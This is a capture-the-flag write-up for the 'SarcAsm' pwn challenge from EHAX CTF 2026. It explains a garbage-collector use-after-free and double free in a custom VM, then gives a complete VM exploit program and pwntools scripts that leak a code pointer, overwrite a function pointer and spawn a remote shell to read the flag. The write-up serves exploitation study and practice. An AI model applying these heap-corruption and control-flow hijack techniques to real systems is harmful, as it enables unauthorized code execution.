---
title: "[Pwn] SarcAsm"
description: Writeup for "SarcAsm" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Pwn]
toc: true
comments: false
---

# SarcAsm (EHAX CTF 2026)

---

- **Name:** SarcAsm
- **Category:** Pwn
- **Description:** Unsarcastically, introducing the best asm in market: SarcAsm
- **Difficulty:** ★★☆☆☆

---

# TL;DR

This challenge runs a custom stack-based VM.  
A GC (garbage collector) bug frees a buffer’s backing memory even when a **slice** still exists (UAF).  
With a second GC pass we can trigger a **double free**, so two future allocations reuse the same memory chunk.  
We make a **writable buffer** overlap with a **builtin function object**, leak a code pointer, compute the `win` address, overwrite the function pointer, and call it to execute `/bin/sh`.

---

# Overview

The handout contains:

- `sarcasm` — the VM binary (ELF PIE, NX, RELRO, stripped)
- `libc.so.6`, `ld-linux-x86-64.so.2` — provided runtime to match remote

The VM reads from stdin:

```
[u32 code_len | code bytes | runtime data...]
```

We can write VM programs in `.nvm` assembly and build a “blob” with:

```bash
./ld-linux-x86-64.so.2 --library-path . ./sarcasm --asm program.nvm -o program.bin
```

Then we can run locally:

```bash
./ld-linux-x86-64.so.2 --library-path . ./sarcasm --run program.bin < input
```

Remote usage is the same idea: send the `program.bin` bytes first, then send the runtime data.

---

# Solution

## 1) Recon

### VM basics

This VM is stack-based. Important opcodes we used:

- `NEWBUF n` : create a buffer object
- `READ n` : read `n` bytes from stdin **into the buffer** (the buffer is popped)
- `WRITEBUF off n` : read `n` bytes and write into a **buffer** at `off` (buffer is popped)
- `SLICE off len` : create a **slice** view of a buffer
- `PRINTB` : print bytes from a buffer or slice
- `GC` : run the garbage collector
- `BUILTIN 0` : push a builtin function object (id 0)
- `CALL 1` : call a function object with 1 argument

### Quick sanity tests

`READ` pops the buffer (stack underflow if you don’t `DUP`):

```asm
NEWBUF 5
READ 5
PRINTB
HALT
```

Output:

```
trap: stack underflow
```

So we must do:

```asm
NEWBUF 5
DUP
READ 5
PRINTB
HALT
```

### Key discovery: “capacity” is bigger than requested size

This VM allows reading more than the requested `NEWBUF` size. For example:

```asm
NEWBUF 8
DUP
READ 16
SLICE 0 16
PRINTB
HALT
```

This prints 16 bytes correctly. So internally the buffer uses a rounded capacity.

This matters because it makes heap shaping easier.

---

## 2) Root cause

### Bug: GC frees backing memory even if a slice still exists

A slice shares the buffer’s **backing memory pointer**.  
Correct behavior: while a slice is alive, the backing memory must stay alive.

Buggy behavior: GC frees the backing memory even when slices still reference it.

That gives us **UAF (Use-After-Free)**:

- Make a buffer and a slice
- Lose the buffer reference
- Run `GC`
- The slice still exists, but its backing memory is now “free” and can be reused

We confirmed it with this experiment:

1. Fill a buffer with `A...`
2. Create a slice
3. `GC`
4. Allocate a new buffer of the same size and fill with `B...`
5. Print the old slice → it prints `B...`

So the slice reads reused memory.

### Double free (important upgrade)

We can run the bug twice to get a **double free** in the VM’s custom freelist:

- Keep two slices to the same backing
- First `GC` frees the backing (bug)
- Remove one slice reference and run `GC` again
- The same backing can get inserted into the freelist again (dup)

Result: future allocations from that size class return the **same pointer** twice.  
This creates two objects that overlap in memory.

---

## 3) Exploit

### Goal

We want code execution. The binary contains a function that does:

- `execve("/bin/sh", ...)`

We can find it by searching for the string `/bin/sh` in a disassembler (Ghidra/IDA), or by running `strings` and checking XREFs.  
In this binary the `win` function is at a fixed **module offset** (example: `0x3000`).

Because the binary is PIE, we do not know the base address directly.  
So we leak any code pointer inside the same module and use a **constant delta**.

### Plan

1. Trigger double free on size 24
2. Allocate:
   - `w` = a buffer (writable via `WRITEBUF`)
   - `f` = a builtin function object (callable via `CALL`)
3. Make them overlap (same backing chunk)
4. Use a slice `u` to **leak** the first 8 bytes of `f` (a code pointer)
5. Compute `win_addr = leak_addr - 0x1d0` (constant difference found locally)
6. Use `w` to overwrite the first 8 bytes of `f` with `win_addr`
7. Call `f` → jumps to `win` → `/bin/sh`

### Final VM program (`pwn_fixed.nvm`)

```asm
GLOBAL u
GLOBAL s
GLOBAL w
GLOBAL f

; 1) backing + two slices (u is kept for leak, s is for double-free trigger)
NEWBUF 24
DUP
READ 24
DUP
SLICE 0 8
GSTORE u
SLICE 0 24
GSTORE s

; 2) UAF + double-free
GC
PUSH 0
GSTORE s
GC

; 3) overlap: w (buffer) + f (builtin function object)
NEWBUF 24
GSTORE w
BUILTIN 0
GSTORE f

; 4) leak first 8 bytes from f via slice u
GLOAD u
PRINTB

; 5) overwrite f's first 8 bytes via writable buffer w
GLOAD w
DUP
WRITEBUF 0 8
DROP

; 6) call the function object (now points to win)
PUSH 0
GLOAD f
CALL 1
HALT
```

Build it:

```bash
./ld-linux-x86-64.so.2 --library-path . ./sarcasm --asm pwn_fixed.nvm -o pwn_fixed.bin
```

### Remote exploit script (`exploit_remote.py`)

```python
from pwn import *
import struct

HOST = "chall.ehax.in"
PORT = 9999

blob = open("pwn_fixed.bin", "rb").read()

io = remote(HOST, PORT)

# VM protocol: [u32 len | code | runtime...]
io.send(blob)

# READ 24
io.send(b"A"*24)

# Leak 8 bytes (PRINTB from SLICE 0 8)
leak = io.recvn(8)
leak_ptr = struct.unpack("<Q", leak)[0]
print("leak =", hex(leak_ptr))

# win is at a constant delta from the leaked pointer
win_ptr = leak_ptr - 0x1d0
print("win  =", hex(win_ptr))

# Overwrite 8 bytes (WRITEBUF 0 8 reads from stdin)
io.send(struct.pack("<Q", win_ptr))

# Run commands (set PATH because env may be minimal)
io.sendline(b"PATH=/bin:/usr/bin; export PATH; id; ls; cat flag*; exit")

print(io.recvall(timeout=2).decode(errors="ignore"))
```

---

## 4) Why it works

### (A) UAF: slice keeps a pointer to freed memory

- `SLICE` stores something like: `(backing_ptr, offset, length)`
- GC incorrectly frees the `backing_ptr` even when slices still exist
- So the slice reads from memory that can be reused by new objects

### (B) Double free: freelist duplication gives overlapping allocations

After two GC cycles (with one slice removed in between), the same backing chunk can be inserted into the freelist twice.  
Allocating two objects from that freelist returns the same chunk twice.

So we overlap:

- `w` (buffer, writable)
- `f` (builtin function object, callable)

### (C) Hijacking control flow by overwriting a function pointer

The function object contains a code pointer (or a pointer to a call trampoline) in its first 8 bytes.  
We leak it via `PRINTB` using a slice that points into the same memory.

Because both pointers are inside the PIE module, the difference between the leaked pointer and the `win` function is a constant.  
So we can compute `win_addr` without knowing the PIE base.

Finally, we overwrite that pointer using `WRITEBUF` on `w`, then `CALL` jumps to `win`, which runs `/bin/sh`.

---

# Solver

```
from pwn import *
import struct

context.log_level = "info"

HOST = "chall.ehax.in"
PORT = 9999

blob = open("pwn_fixed.bin", "rb").read()

io = remote(HOST, PORT)

io.send(blob)

io.send(b"A"*24)

leak = io.recvn(8)
leak_ptr = struct.unpack("<Q", leak)[0]
log.info(f"leak = {hex(leak_ptr)}")

if (leak_ptr & 0xfff) != 0x1d0:
    log.warning(f"unexpected low12 = {hex(leak_ptr & 0xfff)} (still trying delta method)")

win_ptr = leak_ptr - 0x1d0
log.info(f"win  = {hex(win_ptr)}")

io.send(struct.pack("<Q", win_ptr))

io.sendline(b"PATH=/bin:/usr/bin; export PATH; echo PWNED; /usr/bin/id; /bin/ls; /bin/cat flag* 2>/dev/null; /bin/cat /flag 2>/dev/null; exit")

out = io.recvall(timeout=2)
print(out.decode(errors="ignore"))

```

---
<img width="777" height="191" alt="스크린샷 2026-02-28 100720" src="https://github.com/user-attachments/assets/64de34fd-51f2-43a7-b790-b42f4302079c" />
---

## Repro steps (short checklist)

1. Use provided loader/libc:
   ```bash
   chmod +x sarcasm ld-linux-x86-64.so.2
   ```
2. Save `pwn_fixed.nvm` and build:
   ```bash
   ./ld-linux-x86-64.so.2 --library-path . ./sarcasm --asm pwn_fixed.nvm -o pwn_fixed.bin
   ```
3. Run remote script:
   ```bash
   python3 exploit_remote.py
   ```
